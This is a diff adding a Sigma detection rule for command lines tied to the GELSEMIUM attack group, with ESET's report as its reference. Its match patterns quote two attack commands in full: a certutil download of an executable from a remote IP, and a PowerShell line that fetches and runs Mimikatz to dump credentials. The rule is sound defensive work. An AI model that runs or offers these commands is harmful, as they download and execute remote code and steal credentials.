@@ -1,0 +1,25 @@
+title: GELSEMIUM Attack Group Activity Detection(via cmdline)
+description: It exploits vulnerabilities CVE-2020-0688 and CVE-2012-0158 and makes commands do malicious activities.
+author: Furkan Celik
+status: stable
+date: 2021/06/14
+tags:
+- attack.command_and_control
+- attack.T1071
+- attack.T1071.001
+logsource:
+  product: windows
+  service: powershell
+detection:
+  condition: selection
+  selection:
+    CommandLine|contains:
+    - certutil -urlcache -split -f http://45.83.237.34:9999/server.exe C:\Windows\Temp\serv.exe
+    - cmd /c cd /d "c:\PerfLogs\Admin"&powershell.exe "IEX (New-Object Net.WebClient). DownloadString(‘http://95.179.157.174/19733791/katz.ps1’ Invoke-Mimikatz -DumpCreds" >1.txt&echo [S]&cd&echo [E]
+fields:
+- CommandLine
+falsepositives:
+- "no"
+level: high
+reference:
+- https://www.welivesecurity.com/wp-content/uploads/2021/06/eset_gelsemium.pdf
